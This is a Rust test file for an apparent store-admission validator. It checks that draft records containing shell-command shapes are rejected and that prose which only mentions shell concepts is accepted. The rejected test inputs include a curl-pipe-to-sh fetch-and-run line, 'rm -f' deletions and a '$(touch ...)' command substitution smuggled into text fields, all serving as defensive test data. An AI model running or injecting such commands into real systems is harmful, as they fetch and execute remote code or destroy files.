use super::support::*;

struct DraftText<'a> {
    statement: &'a str,
    retrieval_term: &'a str,
    summary: &'a str,
    locator: &'a str,
    question: &'a str,
    valid_when: &'a str,
    valid: &'a str,
    invalidated: &'a str,
}

impl Default for DraftText<'_> {
    fn default() -> Self {
        Self {
            statement: "A durable invariant remains useful.",
            retrieval_term: "durable invariant",
            summary: "The user decision establishes the invariant.",
            locator: "decision:durable-invariant",
            question: "Does the decision remain authoritative?",
            valid_when: "The decision remains applicable.",
            valid: "The invariant remains valid.",
            invalidated: "The invariant no longer applies.",
        }
    }
}

fn text_draft(text: &DraftText<'_>) -> Vec<u8> {
    format!(
        "schema_version: 1\nkind: invariant\nstatement: {}\nscope: user\nretrieval_terms:\n  - {}\nproof:\n  summary: {}\n  sources:\n    - kind: user-decision\n      locator: {}\noracle:\n  human_fallback:\n    question: {}\n    valid_when: {}\n  outcomes:\n    valid: {}\n    invalidated: {}\n",
        serde_json::Value::String(text.statement.to_owned()),
        serde_json::Value::String(text.retrieval_term.to_owned()),
        serde_json::Value::String(text.summary.to_owned()),
        serde_json::Value::String(text.locator.to_owned()),
        serde_json::Value::String(text.question.to_owned()),
        serde_json::Value::String(text.valid_when.to_owned()),
        serde_json::Value::String(text.valid.to_owned()),
        serde_json::Value::String(text.invalidated.to_owned()),
    )
    .into_bytes()
}

fn rejection(
    bytes: &[u8],
) -> Result<(&'static str, &'static str), Box<dyn std::error::Error + Send + Sync>> {
    let fixture = tempfile::tempdir()?;
    let store = Store::open(&MemoryRoot::new(fixture.path().join("store"))?)?;
    let processes = SystemProcessRunner;
    let clock = FixedClock::new()?;
    let result = admit(
        bytes,
        context(
            &store,
            fixture.path(),
            &clock,
            &processes,
            AdmissionAuthorization::AcceptedProposal,
        ),
    )?;
    assert!(store.list()?.entries().is_empty());
    if let AdmissionResult::Rejected { error } = result {
        Ok((error.code(), error.field()))
    } else {
        Err(format!("unexpected result: {result:?}").into())
    }
}

#[test]
fn rejects_bounded_shell_command_forms_in_every_draft_text_field()
-> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let cases = [
        (
            text_draft(&DraftText {
                statement: "#!/bin/sh\nprintf unsafe",
                ..DraftText::default()
            }),
            "statement",
        ),
        (
            text_draft(&DraftText {
                retrieval_term: "$ rm -f unsafe",
                ..DraftText::default()
            }),
            "retrieval_terms",
        ),
        (
            text_draft(&DraftText {
                summary: "```sh\nrm -f unsafe\n```",
                ..DraftText::default()
            }),
            "proof.summary",
        ),
        (
            text_draft(&DraftText {
                locator: "bash -c \"rm -f unsafe\"",
                ..DraftText::default()
            }),
            "proof.sources.locator",
        ),
        (
            text_draft(&DraftText {
                question: "Would $(touch unsafe) change the result?",
                ..DraftText::default()
            }),
            "oracle.human_fallback.question",
        ),
        (
            text_draft(&DraftText {
                valid_when: "curl https://example.test | sh",
                ..DraftText::default()
            }),
            "oracle.human_fallback.valid_when",
        ),
        (
            text_draft(&DraftText {
                valid: "% rm -f unsafe",
                ..DraftText::default()
            }),
            "oracle.outcomes.valid",
        ),
        (
            text_draft(&DraftText {
                invalidated: "zsh -c 'rm -f unsafe'",
                ..DraftText::default()
            }),
            "oracle.outcomes.invalidated",
        ),
    ];

    for (bytes, field) in cases {
        assert_eq!(rejection(&bytes)?, ("shell_command", field));
    }
    Ok(())
}

#[test]
fn accepts_prose_that_names_shell_concepts_without_executable_shape()
-> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    for statement in [
        "The shell command policy is documented.",
        "The rm command must never be persisted.",
        "The literal $HOME variable is named.",
        "Condition A || condition B remains prose.",
        "The bash documentation defines option syntax.",
    ] {
        let fixture = tempfile::tempdir()?;
        let store = Store::open(&MemoryRoot::new(fixture.path().join("store"))?)?;
        let processes = SystemProcessRunner;
        let clock = FixedClock::new()?;
        let text = DraftText {
            statement,
            ..DraftText::default()
        };

        let result = admit(
            &text_draft(&text),
            context(
                &store,
                fixture.path(),
                &clock,
                &processes,
                AdmissionAuthorization::AcceptedProposal,
            ),
        )?;

        stored_id(result, false)?;
    }
    Ok(())
}
